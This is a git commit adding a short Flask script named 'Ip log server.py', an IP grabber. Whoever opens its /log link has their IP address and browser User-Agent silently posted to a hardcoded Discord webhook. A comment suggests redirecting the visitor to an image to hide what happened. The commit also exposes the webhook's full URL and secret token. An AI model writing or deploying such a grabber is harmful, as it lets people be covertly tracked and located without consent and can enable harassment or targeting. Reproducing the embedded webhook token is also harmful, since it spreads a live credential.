568d97dfe0012fe335bb357968847d758033105a
GENGAOG1 <g9645427@outlook.de>
2026-07-14 07:03:03 +0200

    Add files via upload

---
+++ Ip log server.py
@@ -0,0 +1,18 @@
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"
+
+@app.route('/log')
+def log_ip():
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    data = {
+        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
+    }
+    requests.post(WEBHOOK_URL, json=data)
+    return "OK"  # oder redirect zu Bild
+
+if __name__ == "__main__":
+    app.run()
